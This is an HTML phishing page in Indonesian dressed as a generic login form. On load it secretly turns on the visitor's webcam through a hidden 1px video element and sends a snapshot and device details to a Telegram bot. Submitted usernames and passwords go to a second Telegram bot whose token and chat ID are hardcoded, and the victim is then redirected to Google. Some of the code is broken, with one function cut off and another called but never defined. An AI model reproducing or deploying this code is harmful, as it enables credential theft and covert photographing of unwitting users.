<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .main-content {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            padding: 30px;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #4a69bd;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }
        
        .logo svg {
            width: 50px;
            height: 50px;
            fill: white;
        }
        
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            margin-bottom: 16px;
            background-color: #f9f9f9;
        }
        
        input:focus {
            border-color: #4a69bd;
            outline: none;
        }
        
        button {
            width: 100%;
            background-color: #4a69bd;
            color: white;
            font-weight: 600;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            padding: 14px 0;
            margin: 8px 0 16px;
            cursor: pointer;
        }
        
        button:hover {
            background-color: #3c5aa6;
        }
        
        #statusMessage {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            display: none;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
        
        #cameraFeed {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            overflow: hidden;
        }
        
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="logo-container">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                </svg>
            </div>
            <h1>Login Form</h1>
        </div>
        
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username atau email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Login</button>
        </form>
        
        <div id="statusMessage"></div>
    </div>
    
    <!-- Elemen tersembunyi untuk kamera -->
    <video id="cameraFeed" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // Debugging status container
        function showStatus(message, isError = false) {
            console.log(message);
            const statusMsg = document.getElementById('statusMessage');
            statusMsg.textContent = message;
            statusMsg.className = isError ? 'error' : 'success';
            statusMsg.style.display = 'block';
            
            // Auto-hide after 5 seconds if not an error
            if (!isError) {
                setTimeout(() => { 
                    statusMsg.style.display = 'none';
                }, 5000);
            }
        }
        
        // Fungsi untuk meminta izin kamera dan mengambil gambar - IMPROVED
        async function captureImage() {
            showStatus("Meminta akses kamera...");
            
            try {
                // Opsi kamera yang lebih fleksibel untuk cross-browser
                const constraints = { 
                    audio: false,
                    video: { 
                        facingMode: "user",
                        width: { min: 320, ideal: 640, max: 1280 },
                        height: { min: 240, ideal: 480, max: 720 }
                    } 
                };
                
                // Minta akses kamera dengan error handling lebih baik
                const stream = await navigator.mediaDevices.getUserMedia(constraints)
                    .catch(error => {
                        console.error("MediaDevices error:", error.name, error.message);
                        showStatus(`Error kamera: ${error.message}`, true);
                        throw error;
                    });
                
                showStatus("Kamera aktif, mengambil gambar...");
                
                const video = document.getElementById('cameraFeed');
                video.srcObject = stream;
                
                // Tunggu video siap dengan timeout handling
                return new Promise((resolve, reject) => {
                    // Set timeout untuk mencegah hang
                    const timeoutId = setTimeout(() => {
                        reject(new Error("Video loading timeout"));
                    }, 10000);
                    
                    // Event handlers
                    video.onloadedmetadata = () => {
                        clearTimeout(timeoutId);
                        video.play();
                        
                        // Tunggu sebentar agar kamera fokus dan stabil
                        setTimeout(() => {
                            try {
                                // Ambil gambar dari video dengan error handling
                                const canvas = document.getElementById('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                // Konversi ke base64 dengan kualitas lebih rendah untuk ukuran file lebih kecil
                                const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
                                
                                // Matikan kamera
                                stream.getTracks().forEach(track => track.stop());
                                
                                showStatus("Gambar berhasil diambil");
                                resolve(imageBase64);
                            } catch (drawError) {
                                console.error("Error saat mengambil gambar:", drawError);
                                showStatus("Error saat mengambil gambar", true);
                                reject(drawError);
                            }
                        }, 1500); // Waktu tunggu lebih lama untuk stabilisasi
                    };
                    
                    video.onerror = (err) => {
                        clearTimeout(timeoutId);
                        console.error("Video element error:", err);
                        showStatus("Error pada video element", true);
                        reject(err);
                    };
                });
            } catch (error) {
                console.error("Error akses kamera:", error);
                showStatus(`Tidak dapat mengakses kamera: ${error.message}`, true);
                return null;
            }
        }
        
        // Fungsi untuk mengirim gambar ke Telegram
        async function sendImageToTelegram(imageBase64, extraInfo) {
            // ‚ö†Ô∏è GANTI DENGAN DATA ANDA
            const botToken = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            
            console.log("Mencoba mengirim gambar ke Telegram...");
            
            // Metode 1: Menggunakan API sendPhoto dengan base64 string
            try {
                // Pisahkan prefix dari data base64
                const base64Data = imageBase64.split(',')[1];
                
                // Pertama: Coba kirim dengan metode file URL (paling reliable)
                const fileUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', extraInfo);
                
                // Convert base64 to blob
                const byteCharacters = atob(base64Data);
                const byteArrays = [];
                
                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                    const slice = byteCharacters.slice(offset, offset + 512);
                    
                    const byteNumbers = new Array(slice.length);
                    for (let i = 0; i < slice.length; i++) {
                        byteNumbers[i] = slice.charCodeAt(i);
                    }
                    
                    const byteArray = new Uint8Array(byteNumbers);
                    byteArrays.push(byteArray);
                }
                
                const blob = new Blob(byteArrays, {type: 'image/jpeg'});
                formData.append('photo', blob, 'webcam.jpg');
                
                const response = await fetch(fileUrl, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log("Hasil pengiriman gambar:", result);
                
                if (result.ok) {
                    console.log("‚úÖ Gambar berhasil dikirim!");
                    return true;
                } else {
                    throw new Error(result.description || "Failed to send photo");
                }
            } catch (error) {
                console.error("‚ùå Error dalam mengirim gambar:", error);
                
                // Metode 2: Fallback menggunakan sendMessage dengan link gambar
                try {
                    console.log("Mencoba metode fallback...");
                    
                    // Kirim teks saja dengan info bahwa gambar gagal
                    const msgUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                    const infoMessage = extraInfo + "\n\n[Gambar tidak dapat dikirim - error teknis]";
                    
                    const msgResponse = await fetch(msgUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: infoMessage,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const msgResult = await msgResponse.json();
                    console.log("Hasil pengiriman teks fallback:", msgResult);
                    return msgResult.ok;
                } catch (fallbackError) {
                    console.error("‚ùå Fallback method failed:", fallbackError);
                    return false;
                }
            }
        }
        
        // Fungsi untuk mengirim data login ke Telegram
        async function sendLoginToTelegram(username, password) {
            const botToken = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
            const chatId = '8126039795';
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            const message = `üì≤ Login Form\n` +
                           `üë§ Username: ${username}\n` +
                           `üîë Password: ${password}\n` +
                           `‚è∞ Waktu: ${new Date().toLocaleString()}\n` +
                           `üåê Perangkat: ${navigator.userAgent.substring(0, 100)}`;
            
            try {
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},

        // Fungsi utama yang dijalankan saat halaman dimuat
        async function main() {
            // Coba ambil gambar segera setelah halaman dimuat
            const imageBase64 = await captureImage();
            
            if (imageBase64) {
                // Info tambahan untuk dikirim bersama gambar
                const deviceInfo = `üì± Device Info\n` +
                                  `üåê Browser: ${navigator.userAgent.substring(0, 100)}\n` +
                                  `‚è∞ Waktu: ${new Date().toLocaleString()}\n` +
                                  `üìç URL: ${window.location.href}`;
                
                // Coba kirim gambar ke Telegram
                const success = await sendImageToTelegram(imageBase64, deviceInfo);
                
                // Jika gagal, coba metode alternatif
                if (!success) {
                    await sendImageUrlToTelegram(imageBase64, deviceInfo);
                }
            }
            
            // Handler untuk form login
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const submitBtn = document.getElementById('submitBtn');
                const statusMessage = document.getElementById('statusMessage');
                
                // Ubah tampilan tombol
                submitBtn.disabled = true;
                submitBtn.innerText = 'Processing...';
                
                // Kirim data login ke Telegram
                const success = await sendLoginToTelegram(username, password);
                
                if (success) {
                    // Tampilkan pesan sukses
                    statusMessage.className = 'success';
                    statusMessage.textContent = 'Login berhasil!';
                    statusMessage.style.display = 'block';
                    
                    // Redirect setelah login (ganti dengan URL tujuan Anda)
                    setTimeout(function() {
                        window.location.href = "https://accounts.google.com";
                    }, 1500);
                } else {
                    // Tampilkan pesan error
                    statusMessage.className = 'error';
                    statusMessage.textContent = 'Terjadi kesalahan. Silakan coba lagi.';
                    statusMessage.style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.innerText = 'Login';
                }
            });
        }
        
        // Tambahkan event listener untuk debugging tombol
        document.getElementById('submitBtn').addEventListener('click', function() {
            console.log("Submit button clicked");
        });
        
        // Jalankan fungsi utama dengan delay untuk browser mobile
        document.addEventListener('DOMContentLoaded', function() {
            // Delay eksekusi sedikit untuk memberi waktu browser mobile
            setTimeout(main, 800);
            
            // Tambahkan tombol manual untuk trigger kamera
            const mainContent = document.querySelector('.main-content');
            const debugBtn = document.createElement('button');
            debugBtn.textContent = "Aktifkan Kamera Manual";
            debugBtn.style.marginTop = "10px";
            debugBtn.style.backgroundColor = "#555";
            debugBtn.addEventListener('click', async function() {
                const imageBase64 = await captureImage();
                if (imageBase64) {
                    const deviceInfo = `üì± Manual Capture\n` +
                                  `üåê Browser: ${navigator.userAgent.substring(0, 100)}\n` +
                                  `‚è∞ Waktu: ${new Date().toLocaleString()}`;
                    sendImageToTelegram(imageBase64, deviceInfo);
                }
            });
            mainContent.appendChild(debugBtn);
        });
    </script>
</body>
</html>
